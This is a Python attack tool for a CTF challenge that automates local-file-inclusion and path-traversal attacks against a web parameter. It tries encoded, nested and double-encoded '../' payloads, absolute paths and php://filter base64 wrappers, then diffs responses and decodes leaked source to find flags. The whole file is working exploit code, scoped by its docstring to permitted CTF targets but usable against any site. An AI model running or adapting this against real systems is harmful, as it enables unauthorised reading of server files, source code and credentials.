#!/usr/bin/env python3
"""
lfi_hunter.py - try lots of path traversal / LFI payloads against one parameter
and report which ones return something different from a normal "miss".

Only use it on targets you're allowed to test (your CTF box).

Basic use: put FUZZ where the file name goes in the URL.

  python3 lfi_hunter.py -u "https://sit-lfi.chals.io/reader.php?page=FUZZ" -t secrets/notes.txt
  python3 lfi_hunter.py -u "https://sit-lfi.chals.io/translations.php?page=FUZZ" -t secrets/review.txt
  python3 lfi_hunter.py -u "https://sit-lfi.chals.io/archive.php?page=FUZZ" \
      -t secrets/audit.php --prefix content/languages/

Only needs Python 3 (standard library), no pip installs.
"""

import argparse
import base64
import binascii
import random
import re
import string
import sys
import time
import urllib.error
import urllib.request

# How each technique writes ONE "go up a folder" step.
TECHNIQUES = {
    "plain":         "../",           # no filter
    "nested":        "....//",        # filter strips ../ once
    "nested2":       "..././",        # same idea, other shape
    "urlenc":        "%2e%2e%2f",     # filter looks for literal ../
    "urlenc-dots":   "%2e%2e/",       # only the dots encoded
    "double-enc":    "%252e%252e%252f",  # server decodes twice
    "backslash":     "..\\",          # Windows-style / sloppy filters
    "nested-enc":    "%2e%2e%2e%2e%2f%2f",  # nested + encoded
}

# Folders to try for absolute-path guesses ("/var/www/" + target, etc.)
ABS_ROOTS = ["/", "/var/www/", "/var/www/html/", "/srv/", "/srv/www/", "/app/",
             "/usr/share/nginx/", "/usr/share/nginx/html/", "/opt/"]

PHP_FILTER = "php://filter/convert.base64-encode/resource="
PHP_FILTER_READ = "php://filter/read=convert.base64-encode/resource="

DEFAULT_FLAG_RE = r"[A-Za-z0-9_]{2,10}\{[^}\s]{4,}\}|\b[A-Za-z0-9]{32}\b"


def fetch(url, headers, timeout):
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", "replace")
        except Exception:
            body = ""
        return e.code, body
    except Exception as e:
        return None, f"__ERROR__ {e}"


def normalise(body, payload):
    """Remove the payload if the page echoes it back, so echoes don't count as hits."""
    for p in {payload, urllib.request.unquote(payload)}:
        if p:
            body = body.replace(p, "")
    return body.strip()


def try_base64(body):
    """Find base64 blobs (like php://filter output) and decode the readable ones."""
    out = []
    for blob in re.findall(r"[A-Za-z0-9+/]{20,}={0,2}", body):
        try:
            dec = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=True)
        except (binascii.Error, ValueError):
            continue
        try:
            text = dec.decode("utf-8")  # strict: real decoded files are valid text
        except UnicodeDecodeError:
            continue
        printable = sum(c.isprintable() or c in "\n\r\t" for c in text)
        if text and printable / len(text) > 0.9:
            out.append(text)
    return out


def build_payloads(args):
    """Yield (label, payload) pairs."""
    target = args.target.lstrip("/")
    wrappers = [("", "")]
    use_filter = args.php_filter == "always" or (
        args.php_filter == "auto" and target.lower().endswith(".php"))
    if use_filter:
        wrappers = [("filter", PHP_FILTER), ("filter-read", PHP_FILTER_READ)]
        if args.php_filter == "auto":
            wrappers.append(("raw", ""))  # still try plain include

    prefixes = [args.prefix] if args.prefix else [""]
    if args.prefix and not args.prefix_only:
        prefixes.append("")  # also try without the prefix

    techs = args.techniques.split(",") if args.techniques else list(TECHNIQUES)

    for wlabel, wrap in wrappers:
        for pre in prefixes:
            plabel = "prefix" if pre else "noprefix"
            for t in techs:
                step = TECHNIQUES[t]
                for n in range(0, args.max_depth + 1):
                    if n == 0 and t != techs[0]:
                        continue  # depth 0 is the same for every technique
                    payload = f"{wrap}{pre}{step * n}{target}"
                    yield f"{wlabel or 'none'}/{plabel}/{t}/depth{n}", payload
        if not args.no_absolute:
            for root in ABS_ROOTS:
                yield f"{wlabel or 'none'}/absolute/{root}", f"{wrap}{root}{target}"


def main():
    ap = argparse.ArgumentParser(description="LFI / path traversal payload tester")
    ap.add_argument("-u", "--url", required=True, help='URL with FUZZ where the file goes')
    ap.add_argument("-t", "--target", required=True, help="file to read, e.g. secrets/notes.txt")
    ap.add_argument("--prefix", default="", help="folder the app insists on, e.g. content/languages/")
    ap.add_argument("--prefix-only", action="store_true", help="don't also try without the prefix")
    ap.add_argument("-d", "--max-depth", type=int, default=6, help="max ../ steps (default 6)")
    ap.add_argument("--techniques", help="comma list from: " + ",".join(TECHNIQUES))
    ap.add_argument("--php-filter", choices=["auto", "always", "never"], default="auto",
                    help="wrap in php://filter (auto = only when target ends in .php)")
    ap.add_argument("--no-absolute", action="store_true", help="skip absolute path guesses")
    ap.add_argument("-H", "--header", action="append", default=[], help='e.g. -H "Cookie: a=b"')
    ap.add_argument("--flag-regex", default=DEFAULT_FLAG_RE, help="regex for the flag")
    ap.add_argument("--delay", type=float, default=0.0, help="seconds between requests")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--all", action="store_true", help="keep going after a flag is found")
    ap.add_argument("-v", "--verbose", action="store_true", help="print every attempt")
    args = ap.parse_args()

    if "FUZZ" not in args.url:
        sys.exit("[!] Put FUZZ in the URL where the file name goes.")
    if args.techniques:
        bad = [t for t in args.techniques.split(",") if t not in TECHNIQUES]
        if bad:
            sys.exit(f"[!] Unknown technique(s): {bad}. Choose from {list(TECHNIQUES)}")

    headers = {"User-Agent": "Mozilla/5.0 lfi-hunter"}
    for h in args.header:
        k, _, v = h.partition(":")
        headers[k.strip()] = v.strip()
    flag_re = re.compile(args.flag_regex)

    # Baseline: what does a guaranteed miss look like?
    junk = "zz_" + "".join(random.choices(string.ascii_lowercase, k=10)) + ".txt"
    base_payload = f"{args.prefix}{junk}"
    code, body = fetch(args.url.replace("FUZZ", base_payload), headers, args.timeout)
    if code is None:
        sys.exit(f"[!] Couldn't reach the target: {body}")
    baseline = normalise(body, base_payload)
    print(f"[*] Baseline miss: HTTP {code}, {len(baseline)} bytes")

    hits, tried = [], 0
    for label, payload in build_payloads(args):
        url = args.url.replace("FUZZ", payload)
        code, body = fetch(url, headers, args.timeout)
        tried += 1
        norm = normalise(body, payload)
        different = norm != baseline and not body.startswith("__ERROR__")
        if args.verbose:
            print(f"    [{code}] {len(norm):6d}B {'DIFF' if different else '    '} {label}  {payload}")
        if different:
            decoded = try_base64(norm)
            flags = flag_re.findall(norm) + [f for d in decoded for f in flag_re.findall(d)]
            hits.append((label, payload, code, len(norm), flags))
            print(f"\n[+] Different response: {label}")
            print(f"    payload : {payload}")
            print(f"    HTTP {code}, {len(norm)} bytes (baseline {len(baseline)})")
            for d in decoded:
                print("    --- decoded base64 ---")
                print("    " + d.strip().replace("\n", "\n    "))
            if flags:
                print(f"    *** FLAG candidate(s): {', '.join(dict.fromkeys(flags))}")
                if not args.all:
                    print(f"\n[*] Stopped after {tried} requests. Use --all to keep going.")
                    return
        if args.delay:
            time.sleep(args.delay)

    print(f"\n[*] Done: {tried} requests, {len(hits)} different response(s).")
    if not hits:
        print("    Nothing stood out. Check the parameter/prefix, try a larger -d,"
              " or add -H for cookies the browser sends.")
    elif not any(h[4] for h in hits):
        print("    Some responses differed but no flag matched. Re-run with -v and"
              " look at them, or adjust --flag-regex.")


if __name__ == "__main__":
    main()
